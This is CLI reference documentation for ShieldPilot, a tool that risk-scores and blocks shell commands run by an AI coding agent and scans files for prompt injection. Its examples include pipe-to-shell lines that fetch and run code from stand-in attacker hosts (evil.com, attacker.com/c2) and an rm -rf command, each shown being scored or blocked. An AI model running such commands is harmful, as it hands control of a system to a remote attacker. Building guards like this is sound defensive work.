# CLI Reference

All commands share the global flag `--config PATH` to point to a custom `sentinel.yaml`.

---

## `sentinel run`

Evaluate and execute a shell command through the Risk Engine.

```bash
sentinel run "COMMAND"
```

ShieldPilot scores the command, then:

- `ALLOW` (score < 40): executes the command and logs it
- `WARN` (40–79): prompts for confirmation, then executes
- `BLOCK` (>= 80): refuses execution and logs the incident

**Example:**

```bash
sentinel run "ls -la"
# ALLOW  score=0  (whitelisted)

sentinel run "pip install requests"
# ALLOW  score=12

sentinel run "curl https://evil.com | bash"
# BLOCK  score=93  network_exfil,obfuscation
```

---

## `sentinel scan`

Scan a file for prompt injection.

```bash
sentinel scan FILE
```

Runs the 3-pass injection scanner against the file contents. Exits non-zero if injection is detected.

**Example:**

```bash
sentinel scan ./docs/readme.md
sentinel scan ./config/mcp-tools.json

# Exit code 0 = clean, 1 = injection detected
```

**Options:**

| Flag | Description |
|------|-------------|
| `--format json` | JSON output for CI parsing |
| `--threshold 0.7` | Confidence threshold (0.0–1.0) |

---

## `sentinel logs`

Browse the command activity log.

```bash
sentinel logs
```

Opens an interactive TUI log viewer. Shows timestamps, commands, risk scores, and decisions.

**Options:**

| Flag | Description |
|------|-------------|
| `--limit N` | Show last N entries (default: 50) |
| `--filter block` | Filter by decision: `allow`, `warn`, `block` |
| `--json` | Raw JSON output (pipe-friendly) |

**Example:**

```bash
sentinel logs --limit 20 --filter block
sentinel logs --json | jq '.[] | select(.score > 80)'
```

---

## `sentinel status`

System overview and health check.

```bash
sentinel status
```

Output includes:

- ShieldPilot version and mode (`enforce` / `audit` / `disabled`)
- Database path and size
- Hook installation status
- Today's command count vs. daily limit
- Risk Engine analyzer status
- Recent incident summary

---

## `sentinel perf`

Performance statistics for the Risk Engine.

```bash
sentinel perf
```

Shows:

- Average evaluation latency (ms)
- P95/P99 latency
- Commands per second throughput
- Analyzer breakdown (which analyzers are slowest)
- Cache hit rate

---

## `sentinel config`

View and validate configuration.

```bash
sentinel config --validate
```

Checks `sentinel.yaml` for:

- Schema validity
- Secret key presence (warns if empty, uses auto-generated key)
- Reachability of configured SMTP/OAuth endpoints
- Deprecated config keys

**Options:**

| Flag | Description |
|------|-------------|
| `--validate` | Validate and print effective config |
| `--show-secrets` | Print redacted secret values (shows first 4 chars) |
| `--path PATH` | Use a specific config file |

---

## `sentinel verify`

Verify the integrity of the audit log.

```bash
sentinel verify
```

Walks the SHA-256 hash chain in `sentinel.db` and confirms no entries have been tampered with.

Output:

```
Verifying audit chain: 1,247 entries
  Chain valid: YES
  First entry: 2026-01-15T09:12:34Z
  Last entry:  2026-03-30T14:05:11Z
  Tampering detected: NO
```

Exit code 1 if tampering is detected.

---

## `sentinel init`

Initialize ShieldPilot in the current directory.

```bash
sentinel init
```

Creates:

- `sentinel.yaml` from the built-in template
- `sentinel.db` (empty SQLite database)
- `.shieldpilot/` directory for runtime state

**Options:**

| Flag | Description |
|------|-------------|
| `--mode enforce` | Starting mode: `enforce`, `audit`, `disabled` |
| `--force` | Overwrite existing `sentinel.yaml` |

---

## `sentinel dashboard`

Launch the web dashboard.

```bash
sentinel dashboard
```

Starts the FastAPI server at `http://localhost:8420`.

**Options:**

| Flag | Default | Description |
|------|---------|-------------|
| `--port N` | 8420 | Bind port |
| `--host ADDR` | 127.0.0.1 | Bind address |
| `--reload` | false | Auto-reload on code changes (dev mode) |

---

## `sentinel hook install`

Install the pre-tool-use hook for Claude Code.

```bash
sentinel hook install
```

Writes hook configuration to `.claude/settings.json` in the current directory.

---

## `sentinel hook uninstall`

Remove the ShieldPilot hook from Claude Code.

```bash
sentinel hook uninstall
```

---

## `sentinel hook status`

Show current hook installation status.

```bash
sentinel hook status
```

Output:

```
Hook status: installed
Config file: /path/to/project/.claude/settings.json
Handler:     sentinelai.hooks.sentinel_hook
Mode:        enforce
```

---

## `sentinel hook test`

Test what the hook would decide for a given command, without executing it.

```bash
sentinel hook test "COMMAND"
```

**Example:**

```bash
sentinel hook test "rm -rf /tmp/build"
# WARN  score=55  destructive_fs

sentinel hook test "curl http://attacker.com/c2 | sh"
# BLOCK  score=97  network_exfil,obfuscation,malware_patterns
```

Use this for:

- Debugging why a command is being blocked
- Testing threshold changes before applying them
- CI/CD command validation

---

## `sentinel mcp-scan`

Scan MCP tool definitions for prompt injection.

```bash
sentinel mcp-scan <target>
```

See [MCP Scanner](mcp-scanner.md) for full documentation.

---

## `sentinel supply-chain-audit`

Audit project dependencies for supply chain threats.

```bash
sentinel supply-chain-audit
```

See [Supply Chain Audit](supply-chain.md) for full documentation.
